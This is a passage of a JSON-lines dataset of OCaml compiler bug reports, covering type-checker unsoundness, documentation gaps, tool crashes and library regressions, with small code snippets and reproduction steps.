u) x\r\n...\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7394\n**Reporter:** bartjacobs\n**Status:** resolved (set by @xavierleroy on 2017-02-16T09:53:43Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.03.0\n**Target version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\n**Category:** documentation\n**Related to:** #7392\n\n## Bug description\n\nThe new warning 52 documentation (Sec. 8.5.1, under Batch compilation) encourages users to catch Failure _ to detect a particular failure mode for a function they're calling. That's a bad idea, because it's too easy for the implementors of that function to inadvertently propagate a Failure, raised for another reason, from a nested call. In other words, it's a bad idea because you don't know that a Failure you catch was raised for the reason you think.\r\n\r\nIn fact, typically the documentation for standard library functions that throw Failure does not even explicitly state that the function will throw Failure *only* for the reasons stated. (See my #7392 on this.)\r\n\r\nBut even if the docs did explicitly state that, it would still be problematic because it would be hard to ensure that the implementations actually conform to the specs (and continue to do so as code evolves).\r\n\r\nI think the fix is to use functions that indicate specific conditions that users may want to detect as a special return value (e.g. None), enabled by a richer return type, e.g. 'a option instead of 'a, instead of throwing Failure.\r\n\r\nAn alternative but less advisable fix is to use functions that raise a special-purpose exception, instead of the generic Failure. However, this approach still suffers from the (smaller) risk of the exception being propagated inadvertently from a nested call.\r\n\r\nI propose that the warning 52 documentation be updated.\r\n\r\n(I also propose that variants of the standard library functions that throw Failure for specific conditions that users want to detect be provided that allow detecting such conditions through a special return value. But (just to pick one home for each work item) I propose that this latter proposal be tracked through #7392 instead of this one.)\n"},{"labels":["bug"],"text":"**Original bug ID:** 7393\n**Reporter:** fbalestrieri\n**Assigned to:** @gasche\n**Status:** resolved (set by @gasche on 2016-10-27T11:05:21Z)\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.03.0\n**Category:** ~DO NOT USE (was: OCaml general)\n**Monitored by:** @gasche\n\n## Bug description\n\nWhen floating attributes [@@@like_this] are used, they provoke the start of a new structure, rather than being part of the surrounding structure.\n\n## Steps to reproduce\n\n(** The Parstree.structures are split around floating attributes.\r\n\r\nCOMPILE:\r\n    ocamlc -I +compiler-libs  ocamlcommon.cma  trace.ml -o trace;\r\n\r\nRUN:\r\n    ocamlc -c -I +compiler-libs -ppx ./trace trace.ml;\r\n\r\nOUTPUT:\r\n   structure\r\n   structure\r\n   structure\r\n\r\nEXPECTED OUTPUT:\r\n   structure\r\n*)\r\n\r\nopen Ast_mapper\r\n\r\nlet () = register \"trace\" @@ fun argv ->\r\n  { default_mapper with\r\n    structure = (fun m s ->\r\n      print_endline \"structure\";\r\n      default_mapper.structure m s)\r\n  }\r\n[@@@A]\r\n[@@@B]\n"},{"labels":["bug",null,null],"text":"**Original bug ID:** 7392\n**Reporter:** bartjacobs\n**Status:** resolved (set by @xavierleroy on 2016-12-07T18:14:17Z)\n**Resolution:** duplicate\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.03.0\n**Category:** documentation\n**Related to:** #7394\n**Monitored by:** @gasche\n\n## Bug description\n\nSince #254 (Warning on fragile literals in constructor argument patterns) (released in OCaml 4.03), the documentation for int_of_string, which says \"Raise Failure \"int_of_string\" if the given string is not a valid representation of an integer, or if the integer represented exceeds the range of integers representable in type int.\", is inconsistent with the OCaml implementation (specifically, file typing/predef.ml), which declares exception Failure with the warn_on_literal_pattern attribute. The documentation for int_of_string is pretty unequivocal that the behavior of int_of_string in case of malformed input is exactly to raise the exception Failure \"int_of_string\". The warn_on_literal_pattern attribute, on the other hand, suggests that the value of the argument of Failure should not be relied upon, i.e. that instead of throwing Failure \"int_of_string\", int_of_string might in a future OCaml release throw something else in case of malformed input.\r\n\r\nThis is problematic for someone trying to write code that uses int_of_string and that does something other than propagating the exception in case of malformed input.\r\n\r\nThe warning 52 documentation (Sec. 8.5.1, in the Batch compilation chapter) suggests that this person should simply catch any exception that matches Failure _.\r\n\r\nHowever, this raises the following question: What if int_of_string throws a Failure exception for a reason other than malformed input? Perhaps, for int_of_string this is a rather far-fetched scenario, but (without looking at the source code) it is not entirely inconceivable. And for some of the other similar cases, such as int_of_big_int, with presumably a more complex implementation with more failure modes, this is somewhat more conceivable still. And in any case, the documentation for these functions does not state that this will not happen.\r\n\r\nClient code should propagate such an exception instead of treating it as if it indicated malformed input.\r\n\r\nTo fix this problem in a backward-compatible way, I suggest to update the documentation for int_of_string and similar functions (including int_of_big_int), by adding the sentence \"Do not raise a Failure for any other reason.\" Another way to put it is to replace \"Raise Failure \"int_of_string\" if the given string is not a valid representation of an integer, or if the integer represented exceeds the range of integers representable in type int.\" by \"Raise Failure if (and only if) the given string is not a valid representation of an integer, or if the integer represented exceeds the range of integers representable in type int.\" (while of course continuing to raise only Failure \"int_of_string\" for backward compatibility).\r\n\r\n(Of course, one should also check that the current implementations of these functions do indeed not throw Failure for other reasons!)\r\n\r\n(Note: a (much less severe) lack of clarity in the documentation of int_of_string and similar functions existed already before OCaml 4.03: it did not explicitly guarantee that it would not throw Failure \"int_of_string\" for a reason other than malformed input. To see how this is not entirely inconceivable, one could vaguely imagine an implementation that would in some cases directly or indirectly perform a nested int_of_string call with some other input. Again, this is more conceivable with functions that are more complex than int_of_string. But again, the main argument is not about whether it is conceivable, but about whether the documentation should be explicit about it, which seems a clear \"yes\" since people do rely on it and furthermore it's not hard to fix.)\r\n\r\n((Even more parenthesized note: for any function with a non-trivial implementation that involves nested function calls, it is not actually easy to guarantee that the function will *not* throw any given exception, especially if the exception is a generic one such as Failure. This suggests that attaching any postcondition (other than \"true\") to a function raising an exception is dubious, and instead the function's return type should probably be enriched (from 'a to 'a option or 'a + string) so that the exceptional condition can be indicated as a special return value. A client who wishes to ignore the exceptional case can easily turn the special return value into an exception using a partial match (or a helper function that raises an appropriate exception). Note that this is pretty much how error handling is done in Erlang. So, perhaps a better solution would be to introduce a new function, perhaps called int_option_of_string, that returns an int option.))\n\n## Additional information\n\n(I put Severity \"minor\" because this issue is unlikely to lead to many problems at run time, but on the other hand I think this is currently impacting many people who care about writing clearly correct code.)\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7391\n**Reporter:** @nojb\n**Assigned to:** @garrigue\n**Status:** resolved (set by @garrigue on 2016-10-27T14:59:26Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** block\n**Target version:** 4.04.0 +dev / +beta1 / +beta2\n**Fixed in version:** 4.04.0 +dev / +beta1 / +beta2\n**Category:** typing\n**Related to:** #7381\n**Parent of:** #7395\n\n## Bug description\n\nThe following style of code stopped working after commit babad14 (but @garrigue says that this failure is not necessarily related to the issue addressed by that commit).\r\n\r\nclass virtual child1 parent =\r\n  object\r\n    method private parent = parent\r\n  end\r\n\r\nclass virtual child2 =\r\n  object(_ : 'self)\r\n    constraint 'parent = < previous: 'self option; .. >\r\n    method private virtual parent: 'parent\r\n  end\r\n\r\nlet _ =\r\n  object(self)\r\n    method previous = None\r\n    method child =\r\n      object\r\n        inherit child1 self\r\n        inherit child2\r\n      end\r\n  end\r\n\r\n\r\nError: The method parent has type < child : 'a; previous : 'b option >\r\n       but is expected to have type < previous : < .. > option; .. >\r\n       Self type cannot escape its class\n"},{"labels":["bug",null,null],"text":"**Original bug ID:** 7390\n**Reporter:** @stedolan\n**Assigned to:** @garrigue\n**Status:** resolved (set by @garrigue on 2016-10-19T14:08:45Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.03.0\n**Fixed in version:** 4.04.0 +dev / +beta1 / +beta2\n**Category:** typing\n**Child of:** #5998\n**Monitored by:** @yallop\n\n## Bug description\n\nHere's a slightly odd implementation of a sum type:\r\n\r\n    type empty = Empty and filled = Filled\r\n    type ('a,'fout,'fin) opt =\r\n      | N : ('a, 'f, 'f) opt\r\n      | Y : 'a -> ('a, filled, empty) opt\r\n\r\n    type 'fill either =\r\n      | Either : (string, 'fill, 'f) opt * (int, 'f, empty) opt -> 'fill either\r\n\r\nThe intent is that a 'filled either' has values 'Either (Y a, N)' and 'Either (N, Y b)'. However, OCaml accepts the following as exhaustive (both 4.03.0 and 4.02.1):\r\n\r\n    let f (* : filled either -> string *) =\r\n      fun (Either (Y a, N)) -> a\r\n\r\n'f' is inferred to have the commented-out type, but curiously OCaml gives an exhaustivity warning if the annotation is uncommented. If accepted as exhaustive, such a type for 'f' is unsound:\r\n\r\n    # print_string (f (Either (N, Y 4)));;\r\n    Segmentation fault\n"},{"labels":["bug",null,null],"text":"**Original bug ID:** 7387\n**Reporter:** fbalestrieri\n**Assigned to:** @damiendoligez\n**Status:** closed (set by @damiendoligez on 2016-11-02T14:17:22Z)\n**Resolution:** fixed\n**Priority:** high\n**Severity:** minor\n**Version:** 4.03.0\n**Target version:** 4.04.0 +dev / +beta1 / +beta2\n**Fixed in version:** 4.04.0 +dev / +beta1 / +beta2\n**Category:** documentation\n**Tags:** github\n**Monitored by:** @gasche\n\n## Bug description\n\nThe keyword \"nonrec\" is missing from the index of keywords.\n\n## Steps to reproduce\n\nsearch for \"nonrec\" at:\r\nhttp://caml.inria.fr/pub/docs/manual-ocaml/manual045.html\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7385\r\n**Reporter:** @nojb\r\n**Assigned to:** @dra27\r\n**Status:** resolved (set by @damiendoligez on 2017-06-09T09:11:52Z)\r\n**Resolution:** fixed\r\n**Priority:** normal\r\n**Severity:** minor\r\n**Platform:** Windows\r\n**Target version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\r\n**Category:** otherlibs\r\n**Has duplicate:** #7569\r\n**Related to:** #7489\r\n**Monitored by:** @gasche @jmeber @alainfrisch\r\n\r\n## Bug description\r\n\r\nUnix.stat on Windows returns different time stamps (notably the st_mtime field) depending on the DST setting of the machine on which it is executed.\r\n\r\nFor reference, Unix.stat on Un*x returns an absolute timestamp which is completely independent of any time zone/DST setting.\r\n\r\nThis bug appears to have existed for some time (it is at least present in 4.02.0), but of course is hard to spot since the bug causes only a 1hr difference in the resulting timestamp and is only present half the year.\r\n\r\nWe are currently investigating the source of the bug.\r\n\r\n## Steps to reproduce\r\n\r\n$ ocaml unix.cma\r\n> Unix.stat \"foo.txt\";;\r\n\r\nNow, change the DST setting on Windows, repeat the above and see how the timestamps have changed by 1hr.\r\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7384\n**Reporter:** @sliquister\n**Assigned to:** @alainfrisch\n**Status:** resolved (set by @alainfrisch on 2016-10-17T08:37:45Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.03.0\n**Fixed in version:** 4.04.0 +dev / +beta1 / +beta2\n**Category:** middle end (typedtree to clambda)\n**Related to:** #7345\n**Monitored by:** @gasche\n\n## Bug description\n\nThe optimization of optional arguments probably breaks because -g inserts nodes in the lambda AST, which breaks Simplif.split_default_wrapper.\r\n\r\n$ cat c.ml\r\nlet f ?(x = 1) y = x + y\r\n$ ocamlopt -S -c c.ml && grep -m1 inner c.s\r\n\t.globl\tcamlC__f_inner_4\r\n$ ocamlopt -g -S -c c.ml && grep -m1 inner c.s\r\n$\r\n$ ocamlopt -dlambda -g -S -c c.ml && grep -m1 inner c.s\r\n(let\r\n  (f/1199 =\r\n     (function *opt*/1200 y/1203\r\n       (funct-body c.ml(1)<ghost>:6-24\r\n         (before c.ml(1):19-24\r\n           (let\r\n             (x/1201 =\r\n                (if *opt*/1200 (before c.ml(1):12-13 (field 0 *opt*/1200))\r\n                  (before c.ml(1):12-13 1)))\r\n             (before c.ml(1):19-24 (+ x/1201 y/1203)))))))\r\n  (pseudo _none_(1)<ghost>:-1--1 (makeblock 0 f/1199)))\r\n\r\nI think this is worth fixing because it impacts both the normal backend and flambda (as the function might be too big to inline repeatedly).\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7382\n**Reporter:** @alainfrisch\n**Assigned to:** @alainfrisch\n**Status:** closed (set by @alainfrisch on 2016-10-07T08:10:37Z)\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** major\n**Category:** typing\n\n## Bug description\n\n<pre>\r\nlet () = match Exit with Invalid_argument s -> print_endline s\r\n</pre>\r\n\r\n=> segfault on trunk (not 4.04)\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7381\n**Reporter:** @yallop\n**Assigned to:** @garrigue\n**Status:** resolved (set by @garrigue on 2016-10-08T11:12:56Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.04.0 +dev / +beta1 / +beta2\n**Target version:** undecided\n**Fixed in version:** 4.04.0 +dev / +beta1 / +beta2\n**Category:** typing\n**Related to:** #7298 #7391\n**Monitored by:** @gasche\n\n## Bug description\n\nIn 4.04.0+beta2:\r\n\r\n  type (_, _) eql = Refl : ('a, 'a) eql\r\n  let f : type t. (int, t) eql * (t, string) eql -> unit = function _ -> .\r\n\r\n\r\n  Fatal error: exception File \"typing/env.ml\", line 1271, characters 59-65: Assertion failed\n"},{"labels":["bug",null,null],"text":"**Original bug ID:** 7379\n**Reporter:** @yallop\n**Assigned to:** @garrigue\n**Status:** closed (set by @garrigue on 2016-10-08T10:09:33Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\n**Target version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\n**Fixed in version:** 4.04.0 +dev / +beta1 / +beta2\n**Category:** typing\n**Tags:** recmod\n**Duplicate of:** #7324\n**Monitored by:** @gasche\n\n## Bug description\n\nOn trunk (i.e. https://github.com/ocaml/ocaml/commit/facfb642):\r\n\r\n        OCaml version 4.05.0+dev0-2016-08-01\r\n\r\n# module rec F :\r\n  functor (X:sig type t end) -> sig    type s = F(X).s end =\r\n  functor (X:sig type t end) -> struct type s = F(X).s end;;\r\n    Fatal error: exception File \"typing/ctype.ml\", line 1387, characters 10-16: Assertion failed\n"},{"labels":["bug",null,null,null],"text":"**Original bug ID:** 7378\n**Reporter:** @alainfrisch\n**Assigned to:** @garrigue\n**Status:** resolved (set by @garrigue on 2016-09-28T10:42:12Z)\n**Resolution:** fixed\n**Priority:** high\n**Severity:** major\n**Target version:** 4.04.0 +dev / +beta1 / +beta2\n**Fixed in version:** 4.04.0 +dev / +beta1 / +beta2\n**Category:** typing\n**Child of:** #5998\n\n## Bug description\n\n<pre>\r\nmodule X = struct\r\n  type t =\r\n    | A : 'a * 'b * ('a -> unit) -> t\r\nend\r\n\r\nmodule Y = struct\r\n  type t = X.t =\r\n    | A : 'a * 'b * ('b -> unit) -> t\r\nend\r\n\r\n\r\nlet () =\r\n  match Y.A (1, \"\", print_string) with\r\n  | X.A (x, y, f) -> f x\r\n</pre>\r\n\r\nThe definition for Y.t should be rejected, but it's not, leading to a segfault further down.\n"},{"labels":["bug"],"text":"**Original bug ID:** 7377\n**Reporter:** @ygrek\n**Status:** resolved (set by @xavierleroy on 2016-12-05T08:41:31Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.03.0\n**Target version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\n**Fixed in version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\n**Category:** ~DO NOT USE (was: OCaml general)\n**Monitored by:** @gasche\n\n## Bug description\n\nProblem 1\r\n\r\nWhen compiling c++ code via ocamlc (passing -ccopt -xc++ to tell gcc treat .c file as c++ code) gcc will complain that gnu99 applies to C code only\r\n\r\nProblem 2\r\n\r\nWith gcc 6 (for example) default C standard is gnu11 and -std=gnu99 becomes too pessimistic and may cause code to fail (theory - didn't observe this).\r\n\r\nOne way to fix this would be to remove this option from native_c_compiler and require users to supply a C99 supporting compiler at configure time explicitly if needed (with -cc \"gcc -std=gnu99\") - this will solve problem 1 for us because we use newer gcc anyway.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7376\n**Reporter:** eponier\n**Status:** acknowledged (set by @damiendoligez on 2016-09-28T15:15:53Z)\n**Resolution:** open\n**Priority:** normal\n**Severity:** minor\n**Platform:** Linux\n**OS:** Ubuntu\n**OS Version:** 16.04\n**Version:** 4.03.0\n**Target version:** 4.07.0+dev/beta2/rc1/rc2\n**Category:** standard library\n\n## Bug description\n\nThe arguments of Format.printf can no longer be used to specify the size of the breaks.\r\n\r\nFormat.printf \"@[<h>a@;<%d %d>b@]@.\" 4 2\r\n\r\nreturns\r\n\r\na <4 2>b (in 4.03.0 and 4.02.1)\r\n\r\ninstead of\r\n\r\na    b (in 3.12.1)\r\n\r\nThe size of the vertical box can still be specified though.\r\n\r\nFormat.printf \"@[<v %d>a@;b@]@.\" 4\r\n\r\nalways returns\r\n\r\na\r\n    b\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7375\n**Reporter:** @johnwhitington\n**Status:** acknowledged (set by @gasche on 2016-09-28T12:18:47Z)\n**Resolution:** open\n**Priority:** normal\n**Severity:** text\n**Version:** 4.03.0\n**Target version:** 4.07.0+dev/beta2/rc1/rc2\n**Category:** documentation\n\n## Bug description\n\nThe following code in a try...with block:\r\n\r\n     | Exit as e ->\r\n         if !debug then raise e;\r\n         exit 0\r\n\r\ngives:\r\n\r\nRaised at file \"eval.ml\", line 615, characters 27-31\r\nCalled from file \"ocamli.ml\", line 232, characters 10-25\r\nCalled from file \"ocamli.ml\", line 292, characters 21-26\r\nRe-raised at file \"ocamli.ml\", line 300, characters 30-31\r\nCalled from file \"ocamli.ml\", line 307, characters 31-36\r\n\r\nBut the original code, which ought to do the same:\r\n\r\n     | Exit ->\r\n         if !debug then raise Exit;\r\n         exit 0\r\n\r\ngives just:\r\n\r\nRaised at file \"ocamli.ml\", line 300, characters 30-34\r\nCalled from file \"ocamli.ml\", line 307, characters 31-36\n"},{"labels":["bug",null,null],"text":"**Original bug ID:** 7374\n**Reporter:** @lpw25\n**Assigned to:** @garrigue\n**Status:** resolved (set by @garrigue on 2016-09-29T08:42:39Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.04.0 +dev / +beta1 / +beta2\n**Target version:** 4.04.0 +dev / +beta1 / +beta2\n**Fixed in version:** 4.04.0 +dev / +beta1 / +beta2\n**Category:** typing\n**Child of:** #5998\n**Monitored by:** @gasche @yallop\n\n## Bug description\n\nThe contractiveness check ignores constraints, which makes it unsound. For example:\r\n\r\n  type ('a, 'b) eq = Refl : ('a, 'a) eq\r\n\r\n  let trans : type a b x . (a, x) eq -> (b, x) eq -> (a, b) eq =\r\n      fun Refl Refl -> Refl\r\n\r\n  let cast : type a b . (a, b) eq -> a -> b =\r\n      fun Refl x -> x\r\n\r\n  module type S = sig\r\n    type 'a t constraint 'a = [`Rec of 'b]\r\n  end\r\n\r\n  module Fix (X : S) : sig\r\n    type t\r\n    val uniq : ('a, [`Rec of 'a] X.t) eq -> ('a, t) eq\r\n  end = struct\r\n    type t = [`Rec of 'a] X.t as 'a\r\n    let uniq : type a . (a, [`Rec of a] X.t) eq -> (a, t) eq =\r\n        fun Refl -> Refl\r\n  end\r\n\r\n  module Id = struct\r\n    type 'a t = 'b\r\n      constraint 'a = [ `Rec of 'b ]\r\n  end\r\n\r\n  module Bad = Fix(Id)\r\n\r\n  let segfault () =\r\n    print_endline\r\n      (cast (trans (Bad.uniq Refl) (Bad.uniq Refl)) 0)\r\n\r\n  ;; segfault ()\r\n\r\nI think the fix is to consider:\r\n\r\n  [`Rec of 'a] X.t\r\n\r\nas non-contractive when X.t has a constraint of the form [`Rec of 'a].\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7373\n**Reporter:** @dra27\n**Assigned to:** @dra27\n**Status:** resolved (set by @dra27 on 2017-06-10T12:02:42Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** major\n**Version:** 4.03.0\n**Target version:** 4.04.1\n**Fixed in version:** 4.04.1\n**Category:** tools (ocaml{lex,yacc,dep,debug,...})\n**Monitored by:** @gasche\n\n## Bug description\n\nocamlmklib doesn't include OCaml's lib directory in the search path for invocations of the linker.\r\n\r\nFor a FlexDLL 0.35+ installation where the FlexDLL object files are allowed to be installed in a different directory from flexlink.exe itself, this causes an error when using ocamlmklib to compile a DLL.\r\n\r\nGiven that the two compilers always include OCaml's lib dir for everything (using -I or -L as appropriate), is there any reason not to do this for ocamlmklib? It's just a matter of including the standard library directory as the base option for clibs?\n\n## Steps to reproduce\n\n$ cd ocaml-4.03.0/testsuite/tests/lib-dynlink-bytecode\r\n\r\n$ ocamlc -c -verbose stub1.c\r\n+ i686-w64-mingw32-gcc -O -mms-bitfields -Wall -Wno-unused -c -I\"C:/ocamlmgw/lib\" \"stub1.c\"\r\n$ ocamlmklib -verbose -o plug1 stub1.o\r\n+ flexlink -chain mingw -stack 16777216 -link -static-libgcc -o .\\dllplug1.dll stub1.o\r\n** Fatal error: Cannot find file \"flexdll_initer_mingw.o\"\r\n** Fatal error: Cannot find file \"flexdll_initer_mingw.o\"\r\n$ ocamlmklib -verbose -o plug1 stub1.o -L`ocamlc -where`\r\n+ flexlink -chain mingw -stack 16777216 -link -static-libgcc  -o .\\dllplug1.dll stub1.o    -LC:/ocamlmgw/lib\r\n+ rm -f .\\libplug1.a && i686-w64-mingw32-ar rcs  .\\libplug1.a stub1.o\n\n## Additional information\n\nThis isn't caught when running the testsuite, because at that time the object file is in the same directory as flexlink itself (it's all compiled inside the submodule). Not sure that it's worth the effort of torturing the test suite to catch this case.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7372\n**Reporter:** @alainfrisch\n**Assigned to:** @alainfrisch\n**Status:** resolved (set by @alainfrisch on 2017-03-24T14:37:24Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Target version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\n**Fixed in version:** 4.06.0 +dev/beta1/beta2/rc1\n**Category:** typing\n**Tags:** github\n**Related to:** #6716\n**Monitored by:** @gasche @yallop\n\n## Bug description\n\n<pre>\r\nbug1.mli:\r\n  type _ t =  C: { f: ('a -> [<`X]) t } -> [<`X] t\r\n\r\nbug2.ml:\r\n  open Bug1\r\n  let f (C {f}) = ()\r\n</pre>\r\n\r\n<pre>ocamlc -c bug1.mlo bug2.ml</pre>\r\n\r\ngives:\r\n\r\n\r\n<pre>\r\nFile \"bug2.ml\", line 3, characters 9-12:\r\nError: This pattern matches values of type ([< `X ] as 'a, 'b) Bug1.t.C\r\n       but a pattern was expected which matches values of type\r\n         ($C_'a, [< `X ]) Bug1.t.C\r\n       Type [< `X ] as 'a is not compatible with type $C_'a\r\n</pre>\r\n\r\nThe problem probably comes from the internal encoding of inline records as regular records (whose parameters are derived from free variables of the inline record).\r\n\r\nNote: explicitly qualifying <tt>Bug1.C</tt> in bug2.ml removes the error message; so does inlining the type definition in bug2.ml.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7371\n**Reporter:** furuse\n**Assigned to:** @garrigue\n**Status:** resolved (set by @garrigue on 2016-10-11T08:50:44Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** major\n**Version:** 4.03.0\n**Target version:** 4.04.0 +dev / +beta1 / +beta2\n**Fixed in version:** 4.04.0 +dev / +beta1 / +beta2\n**Category:** documentation\n**Related to:** #6956\n**Monitored by:** @gasche @hcarty\n\n## Bug description\n\nProgram with external declaration only mli file fail to link since 4.03.0.  I guess this is due to the fix of #4166 and #6956.\r\n\r\nThe reference manual section 19.6 shows a complete example of adding C primitives in an mli only module but this is no longer working with 4.03.0.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7370\n**Reporter:** @edwintorok\n**Assigned to:** @damiendoligez\n**Status:** closed (set by @damiendoligez on 2016-11-02T14:21:17Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Platform:** x86-64\n**OS:** Linux\n**OS Version:** Gentoo\n**Target version:** 4.04.0 +dev / +beta1 / +beta2\n**Fixed in version:** 4.04.0 +dev / +beta1 / +beta2\n**Category:** tools (ocaml{lex,yacc,dep,debug,...})\n**Tags:** github\n**Monitored by:** @gasche @diml\n\n## Bug description\n\nI tried to build  janestreet/base with 4.04.0+beta2+flambda (ocamldoc in 4.03 doesn't obey -open, and I wanted to generate some docs), but ocamldep crashed:\r\n\r\n[52483.186853] ocamldep[20351]: segfault at c00 ip 000000000040afd7 sp 00007fff5b528f80 error 4 in ocamldep.opt[400000+f5000]\n\n## Steps to reproduce\n\n$ curl -L -o avltree.ml 'https://github.com/janestreet/base/blob/01cd6e6e0b13aa80e872f1fd90799a2f083c9ab9/bootstrap/src/avltree.ml?raw=true'\r\n$ ocamldep avltree.ml\r\nSegmentation fault\r\n$ ocamldep -version\r\nocamldep, version 4.04.0+beta2\r\n$ ocamlc -config\r\nversion: 4.04.0+beta2\r\nstandard_library_default: /home/edwin/.opam/4.04.0+beta2+flambda/lib/ocaml\r\nstandard_library: /home/edwin/.opam/4.04.0+beta2+flambda/lib/ocaml\r\nstandard_runtime: /home/edwin/.opam/4.04.0+beta2+flambda/bin/ocamlrun\r\nccomp_type: cc\r\nbytecomp_c_compiler: gcc -std=gnu99 -O2 -fno-strict-aliasing -fwrapv -Wall -D_FILE_OFFSET_BITS=64 -D_REENTRANT -fPIC\r\nbytecomp_c_libraries: -lm  -ldl -lcurses -lpthread                  \r\nnative_c_compiler: gcc -std=gnu99 -O2 -fno-strict-aliasing -fwrapv -Wall -D_FILE_OFFSET_BITS=64 -D_REENTRANT\r\nnative_c_libraries: -lm  -ldl\r\nnative_pack_linker: ld -r  -o \r\nranlib: ranlib\r\ncc_profile: -pg\r\narchitecture: amd64\r\nmodel: default\r\nsystem: linux\r\nasm: as\r\nasm_cfi_supported: true\r\nwith_frame_pointers: false\r\next_obj: .o\r\next_asm: .s\r\next_lib: .a\r\next_dll: .so\r\nos_type: Unix\r\ndefault_executable_name: a.out\r\nsysthread_supported: true\r\nhost: x86_64-unknown-linux-gnu\r\ntarget: x86_64-unknown-linux-gnu\r\nflambda: true\r\nspacetime: false\r\nexec_magic_number: Caml1999X011\r\ncmi_magic_number: Caml1999I021\r\ncmo_magic_number: Caml1999O011\r\ncma_magic_number: Caml1999A012\r\ncmx_magic_number: Caml1999Y016\r\ncmxa_magic_number: Caml1999Z015\r\nast_impl_magic_number: Caml1999M019\r\nast_intf_magic_number: Caml1999N018\r\ncmxs_magic_number: Caml2007D002\r\ncmt_magic_number: Caml2012T008\n\n## Additional information\n\nOlder versions of the compiler reject the file instead of crashing:\r\n\r\n~/.opam/4.02.3/bin/ocamldep avltree.ml\r\n>> Fatal error: OCaml and preprocessor have incompatible versions\r\nFatal error: exception Misc.Fatal_error\r\n~/.opam/3.12.1/bin/ocamldep avltree.ml\r\nFatal error: exception Failure(\"Ocaml and preprocessor have incompatible versions\")\r\n\r\nStacktrace with 4.04:\r\n(gdb) r\r\nStarting program: /home/edwin/.opam/4.04.0+beta2+flambda/bin/ocamldep avltree.ml\r\n\r\nProgram received signal SIGSEGV, Segmentation fault.\r\n0x000000000040afd7 in camlDepend__add_expr_886 () at parsing/depend.ml:212\r\n212\tparsing/depend.ml: No such file or directory.\r\n(gdb) bt\r\n#0  0x000000000040afd7 in camlDepend__add_expr_886 () at parsing/depend.ml:212\r\n#1  0x0000000000465b61 in camlList__iter_346 () at list.ml:77\r\n#2  0x0000000000465b61 in camlList__iter_346 () at list.ml:77\r\n#3  0x000000000040b7e5 in camlDepend__add_bindings_889 () at parsing/depend.ml:286\r\n#4  0x000000000040b013 in camlDepend__add_expr_886 () at parsing/depend.ml:217\r\n#5  0x0000000000465b61 in camlList__iter_346 () at list.ml:77\r\n#6  0x000000000040b7e5 in camlDepend__add_bindings_889 () at parsing/depend.ml:286\r\n#7  0x000000000040c443 in camlDepend__add_struct_item_900 () at parsing/depend.ml:427\r\n#8  0x0000000000465c48 in camlList__fold_left_389 () at list.ml:88\r\n#9  0x000000000040c319 in camlDepend__add_structure_898 () at parsing/depend.ml:415\r\n#10 0x000000000040ca81 in camlDepend__add_implementation_902 () at parsing/depend.ml:478\r\n#11 0x0000000000406732 in camlOcamldep__read_parse_and_extract_1419 ()\r\n#12 0x0000000000406d1c in camlOcamldep__ml_file_dependencies_1748 ()\r\n#13 0x0000000000407063 in camlOcamldep__process_file_as_1835 ()\r\n#14 0x000000000049111f in camlArg__parse_argv_dynamic_inner_476 () at arg.ml:247\r\n#15 0x0000000000492b49 in camlArg__parse_1143 () at arg.ml:254\r\n#16 0x0000000000408805 in camlOcamldep__entry ()\r\n#17 0x0000000000402479 in caml_program ()\r\n#18 0x00000000004bf3c6 in caml_start_program ()\r\n#19 0x00000000004bfa0d in caml_main (argv=0x7fffffffd4f8) at startup.c:145\r\n#20 0x000000000040200c in main (argc=<optimized out>, argv=<optimized out>) at main.c:37\r\n\r\nShould a magic number be bumped somewhere in 4.04 to make it reject this file?\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7369\n**Reporter:** @johnwhitington\n**Assigned to:** @damiendoligez\n**Status:** resolved (set by @xavierleroy on 2016-12-04T15:34:48Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** major\n**Version:** 4.03.0\n**Target version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\n**Fixed in version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\n**Category:** otherlibs\n**Monitored by:** @gasche\n\n## Bug description\n\n# #load \"str.cma\";;\r\n# let x = \"if\\\\( \\\\|\\\\t\\\\|\\\\n\\\\|\\\\f\\\\|\\\\t\\\\|\\\\)*.*\\\\( \\\\|\\\\t\\\\|\\\\n\\\\|\\\\f\\\\|\\\\t\\\\|\\\\)*=\\\\( \\\\|\\\\t\\\\|\\\\n\\\\|\\\\f\\\\|\\\\t\\\\|\\\\)*.*\";;\r\nval x : string =\r\n  \"if\\\\( \\\\|\\\\t\\\\|\\\\n\\\\|\\\\f\\\\|\\\\t\\\\|\\\\)*.*\\\\( 